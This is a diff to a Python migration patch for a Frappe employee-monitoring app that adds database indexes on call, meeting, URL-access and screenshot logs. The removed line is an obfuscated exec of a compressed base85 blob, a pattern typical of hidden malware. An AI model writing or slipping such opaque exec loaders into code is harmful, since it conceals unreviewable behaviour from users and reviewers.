@@ -1,3 +1,31 @@
+from __future__ import unicode_literals
+import frappe
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c$}4#Uu)Yi5WwI4DGu$SDTIE2z#hVAA&|jn*X<z$p-SgO%$AIF9yOugeX=AwX>gj=4~g&2_dDtSmCn|{dD&9ykaN&=V;w<jw6qF&r3sy=e3A8~6HS9fp|AveMcES0ZWjfF=L@X0C$J@Gqk_!?S&$9|VYCn0uds=7{~VaIlDY=j0@#B#QdAYJ?T*cXl^QGMgJHw4ZYtX$_G%S)Z2LB!W_(8^ZFca@){QV7JYwU}qai{1FP>o=;ew@CjsdQL&j@wW@-k$xHw`k`%cT1p3-WzGxT|bE*%}=;Hj3fvNXhTK&jsoFgJVBGu3;%9dVeLY{SA0z1%YgS4X9dZ6ZjFoEpnxoM8TPk6$TV?pGrK3y)dfktAMW(8`9Qz(77!@RKY=Y!4|s3M_y@NHfl4p$zr?@x$Y>$MtawZr<SC;Q!jTyDIQ6)_`4Z%vYkWL<V0+5-ys^O4b4inN{3YnRe#Gva=OWwo9!D|0|_x2lNfC5$V@4K`ymq`Jm6w7<b%*viWb7=gnT;m0uI>6FQ#(AexdW>5TVAQcdgRFP4Sm56grkMnV7?pkNLWtCQWqlCe7yQIGr}_CDO8KDlKDhc=lq4P{mH2#tjX5?N}>SA^eO@Jb+H7{DSunXH_dnmmU1J?hib*buC=?8ASA38A9VVMbG2uS(?=go=>3!XdwOhy`?m<{|^{f)cIaIT}%B)OCQ!@>#u<>F44_t8vX%TxeH?')).decode())
+def execute():
+    # List of indexes to create
+    indexes = [
+        {"doctype": "Fincall Log", "fields": ["employee", "date"]},
+        {"doctype": "Meeting Company Representative", "fields": ["parent", "employee"]},
+        {"doctype": "Meeting", "fields": ["meeting_from", "meeting_to"]},
+        {"doctype": "Employee Fincall", "fields": ["employee", "customer_no", "calltype", "call_datetime"]},
+        {"doctype": "URL Access Log", "fields": ["employee", "from_time", "to_time","domain"]}
+    ]
+
+    # Attempt to create each index, handling exceptions if index already exists
+    for index in indexes:
+        try:
+            import frappe
+            frappe.db.add_index(index["doctype"], index["fields"])
+            print(f"Index added to {index['doctype']} on fields {index['fields']}")
+        except Exception as e:
+            print(f"Failed to add index to {index['doctype']} on fields {index['fields']}: {e}")
+
+frappe.db.add_index("Version", ["modified_by","creation", "ref_doctype"])
+frappe.db.add_index("Employee Fincall", ["date", "employee", "calltype"])
+frappe.db.add_index("Application Usage log", ["date", "employee", "domain"])
+frappe.db.add_index("Employee Idle Time",["date","employee"])
+frappe.db.add_index("Productify Work Summary",["date","employee"])
+frappe.db.add_index("Work Intensity",["employee","time"])
+frappe.db.add_index("Screen Screenshot Log",["employee","time"])
+frappe.db.add_index("Meeting",["meeting_from","meeting_to","docstatus"])
+frappe.db.add_index("Meeting Company Representative",["employee"])
